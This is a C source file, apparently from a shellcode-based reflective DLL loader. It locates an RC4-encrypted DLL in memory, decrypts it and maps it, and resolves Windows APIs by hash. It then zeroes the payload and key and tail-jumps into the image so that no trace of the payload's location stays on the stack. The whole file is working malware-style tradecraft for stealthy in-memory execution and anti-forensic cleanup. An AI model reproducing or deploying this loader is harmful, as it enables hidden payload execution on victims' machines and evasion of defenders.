#include "framework.h"
#include "headers.h"
#include "payload.h"
#include "pe_loader.h"
#include "rc4.h"
#include "ldr.h"
#include "api_hash.h"

/*
 * Executing entry point of the packed payload.
 *
 * Difference from entrypoint_packed: this one does not return. It maps the
 * image, wipes the payload (the decrypted DLL copy and the RC4 key), writes the
 * payload info where the DLL can find it and then jumps into the image entry
 * point. The DLL is therefore responsible for releasing the payload region.
 *
 * The reason for the jump is the wipe: a "call" would push a return address
 * that points into the memory being wiped, so the stack would advertise where
 * the payload had been, and returning through it would run freed bytes.
 *
 * Like pe_loader.c this file is compiled into the shellcode, so it must contain
 * no string literals and no global or static data. In particular there is no
 * memset here: the wipe uses the local loop below.
 */

/* Provided by get_rip.asm: the address just after the call, inside this code. */
extern PBYTE rfdll_get_rip(void);

/* Provided by tail_jump.asm: enters the image entry point and never returns. */
extern void rfdll_tail_jump(void* image_base, void* lp_reserved, void* entry);

/*
 * First page boundary at or after "address". The metadata sits on a page
 * boundary, so the scan only has to look at page aligned addresses.
 */
static PBYTE rfdll_exec_next_page(PBYTE address)
{
	return (PBYTE)(((UINT64)address + (RFDLL_PAGE_SIZE - 1)) & ~(UINT64)(RFDLL_PAGE_SIZE - 1));
}

/*
 * Locate the metadata by scanning forward, bounded by RFDLL_EXEC_SCAN_LIMIT and
 * by the end of the committed region that holds the payload.
 *
 * region_base/region_limit receive the whole region, so the caller can wipe it
 * afterwards; both are NULL/0 when VirtualQuery could not tell.
 */
static PRFDLL_META rfdll_exec_find_meta(PBYTE start, PBYTE* region_base, PBYTE* region_limit)
{
	PBYTE cursor = NULL;
	PBYTE end = NULL;
	HMODULE kernel32 = NULL;
	fnVirtualQuery virtual_query = NULL;
	MEMORY_BASIC_INFORMATION memory_info;
	DWORD scanned = 0;

	*region_base = NULL;
	*region_limit = NULL;

	kernel32 = GMHR_Hash(HASH_KERNEL32);
	if (kernel32 != NULL)
	{
		virtual_query = (fnVirtualQuery)GPAR_Hash(kernel32, HASH_VIRTUALQUERY);
	}

	cursor = rfdll_exec_next_page(start);
	end = cursor + RFDLL_SCAN_LIMIT;

	if (virtual_query != NULL)
	{
		/*
		 * Query the region that holds the code, not the one after it: the
		 * payload was handed to us as one allocation, so its own start is what
		 * the wipe needs, and its end bounds the scan. Keeping the region end a
		 * 64 bit address matters, the payload is easily above 4 GB.
		 */
		if (virtual_query((LPCVOID)((PBYTE)rfdll_exec_next_page(start) - RFDLL_PAGE_SIZE),
			&memory_info, sizeof(memory_info)) == sizeof(memory_info))
		{
			PBYTE region_end = (PBYTE)memory_info.BaseAddress + memory_info.RegionSize;

			*region_base = (PBYTE)memory_info.BaseAddress;
			*region_limit = region_end;

			if (region_end > cursor && region_end < end)
				end = region_end;
		}
	}

	if (end <= cursor)
		return NULL;

	for (scanned = 0; (PBYTE)(cursor + scanned) < end; scanned += RFDLL_PAGE_SIZE)
	{
		PRFDLL_META candidate = (PRFDLL_META)(cursor + scanned);

		/* Compared against immediates so that no global constant is needed. */
		if (*(DWORD*)candidate->magic == RFDLL_MAGIC_LO &&
			*(DWORD*)(candidate->magic + 4) == RFDLL_MAGIC_HI)
		{
			return candidate;
		}
	}

	return NULL;
}

/*
 * Validate the metadata, then decrypt the image in place.
 *
 * Mirrors rfdll_open_payload in loader_packed.c. A missing region limit refuses
 * the payload rather than decrypting without a bound.
 */
static BOOL rfdll_exec_open_payload(PRFDLL_META meta, PRFDLL_PAYLOAD payload, PBYTE region_limit)
{
	PBYTE image = NULL;
	PBYTE payload_end = NULL;

	if (region_limit == NULL)
		return FALSE;

	if (meta->version != RFDLL_META_VERSION)
		return FALSE;
	if (meta->dll_size < sizeof(IMAGE_DOS_HEADER) || meta->dll_size > RFDLL_MAX_IMAGE_SIZE)
		return FALSE;
	if ((meta->flags & ~RFDLL_FLAG_HEADERS_STRIPPED) != 0)
		return FALSE;
	if (meta->key_length > RFDLL_MAX_KEY_LENGTH)
		return FALSE;

	image = (PBYTE)meta + RFDLL_META_HEADER_SIZE + meta->key_length;
	payload_end = image + meta->dll_size;

	if (payload_end > region_limit || payload_end < image)
		return FALSE;

	payload->meta = meta;
	payload->image = image;
	payload->image_size = meta->dll_size;
	payload->key = (const BYTE*)meta + RFDLL_META_HEADER_SIZE;
	payload->key_length = meta->key_length;
	payload->host_hash = meta->host_hash;
	payload->headers_stripped = (meta->flags & RFDLL_FLAG_HEADERS_STRIPPED) != 0;

	/*
	 * The image is about to be wiped along with everything else left in the
	 * payload, so it has to be copied out first: the mapped image is what
	 * survives, the bytes here are about to be overwritten. Mapping straight
	 * from this buffer would map the file, and the wipe would then destroy the
	 * only copy of it.
	 *
	 * RC4 both encrypts and decrypts, so this turns the ciphertext into the PE.
	 */
	if (payload->key_length != 0)
	{
		rfdll_rc4(image, payload->image_size, payload->key, payload->key_length);
	}

	return TRUE;
}

/*
 * Overwrite a range with zeroes. Not memset: that would be a CRT call, and the
 * volatile accesses keep the compiler from turning the loop back into one.
 */
static void rfdll_exec_wipe(PVOID address, SIZE_T size)
{
	volatile BYTE* cursor = (volatile BYTE*)address;
	SIZE_T index = 0;

	if (address == NULL || size == 0)
		return;

	for (index = 0; index < size; index++)
		cursor[index] = 0;
}

/*
 * Copy the image into memory this loader owns, leaving the payload as the source
 * that is about to be wiped.
 *
 * The copy is made through VirtualAlloc so that the mapped image never aliases
 * the payload region: the wipe has to be able to destroy the payload bytes
 * without touching the PE that is being mapped from them.
 */
static PBYTE rfdll_exec_copy_image(PRFDLL_PAYLOAD payload, fnVirtualAlloc virtual_alloc)
{
	PBYTE copy = NULL;
	SIZE_T index = 0;
	volatile BYTE* destination = NULL;
	const BYTE* source = payload->image;

	if (virtual_alloc == NULL)
		return NULL;

	copy = (PBYTE)virtual_alloc(NULL, payload->image_size, MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	if (copy == NULL)
		return NULL;

	/* Byte copy: the region may overlap nothing, but a DWORD copy would need
	   alignment guarantees that the payload does not offer. */
	destination = (volatile BYTE*)copy;
	for (index = 0; index < payload->image_size; index++)
		destination[index] = source[index];

	return copy;
}

/*
 * Write the payload info into the mapped image at the fixed offset the DLL
 * knows about.
 *
 * Only possible when the packer stripped the headers: the offset lives in the
 * DOS stub area, which stripping wipes. A payload that kept its headers would
 * have the stub bytes still there, so writing over them could corrupt a PE that
 * the CRT or ntdll might still read, and the DLL would read a structure that
 * was never written. The caller checks the flag before calling this.
 */
static void rfdll_exec_write_info(PBYTE image_base, PBYTE payload_base, SIZE_T payload_size,
	DWORD image_size, DWORD host_hash)
{
	PRFDLL_PAYLOAD_INFO info = NULL;

	if (image_base == NULL)
		return;

	info = (PRFDLL_PAYLOAD_INFO)(image_base + RFDLL_PAYLOAD_INFO_OFFSET);

	info->magic = RFDLL_PAYLOAD_INFO_MAGIC;
	info->version = RFDLL_PAYLOAD_INFO_VERSION;
	info->payload_base = payload_base;
	info->payload_size = payload_size;
	info->image_base = image_base;
	info->image_size = image_size;
	info->host_hash = host_hash;
	info->flags = 0;
}

void entrypoint_exec(void)
{
	PBYTE self = NULL;
	PBYTE region_base = NULL;
	PBYTE region_limit = NULL;
	PRFDLL_META meta = NULL;
	RFDLL_PAYLOAD payload;
	PBYTE copy = NULL;
	PBYTE image_base = NULL;
	DWORD entry_rva = 0;
	DWORD image_size = 0;
	BOOL needs_delete_table = FALSE;
	HMODULE kernel32 = NULL;
	fnVirtualAlloc virtual_alloc = NULL;
	fnVirtualFree virtual_free = NULL;
	SIZE_T payload_size = 0;

	self = rfdll_get_rip();
	if (self == NULL)
		return;

	meta = rfdll_exec_find_meta(self, &region_base, &region_limit);
	if (meta == NULL)
		return;

	if (!rfdll_exec_open_payload(meta, &payload, region_limit))
		return;

	/* Resolve what the copy and the wipe need before anything is changed. */
	kernel32 = GMHR_Hash(HASH_KERNEL32);
	if (kernel32 == NULL)
		return;
	virtual_alloc = (fnVirtualAlloc)GPAR_Hash(kernel32, HASH_VIRTUALALLOC);
	virtual_free = (fnVirtualFree)GPAR_Hash(kernel32, HASH_VIRTUALFREE);
	if (virtual_alloc == NULL || virtual_free == NULL)
		return;

	/*
	 * Map from a copy, so that the wipe below can destroy the payload without
	 * destroying the PE being mapped.
	 */
	copy = rfdll_exec_copy_image(&payload, virtual_alloc);
	if (copy == NULL)
		return;

	image_base = rfdll_prepare_image(copy, payload.image_size, &entry_rva,
		&image_size, &needs_delete_table);

	/* The copy has served its purpose either way. */
	virtual_free(copy, 0, MEM_RELEASE);

	if (image_base == NULL || entry_rva == 0)
		return;

	/*
	 * The info has to be written before the wipe, because it is built from the
	 * metadata that the wipe is about to remove.
	 *
	 * It is stored inside the mapped image, not on this frame: the tail jump
	 * abandons the frame, so a pointer to a local would dangle the moment the
	 * image entry point started running.
	 */
	payload_size = 0;
	if (region_base != NULL && region_limit != NULL && region_limit > region_base)
		payload_size = (SIZE_T)(region_limit - region_base);

	rfdll_exec_write_info(image_base, region_base, payload_size, image_size,
		payload.host_hash);

	/*
	 * Wipe the whole payload region: the decrypted image, the RC4 key and the
	 * metadata all live there. The image copy written just above is unaffected,
	 * because it lives in the mapped image rather than in the payload.
	 */
	if (region_base != NULL && payload_size != 0)
	{
		rfdll_exec_wipe(region_base, payload_size);
	}

	/*
	 * Leave for good. lpReserved points at the copy inside the mapped image,
	 * which the DLL can free along with the payload; nothing handed to the DLL
	 * lives in this abandoned frame.
	 */
	rfdll_tail_jump(image_base, (PVOID)(image_base + RFDLL_PAYLOAD_INFO_OFFSET),
		image_base + entry_rva);
}
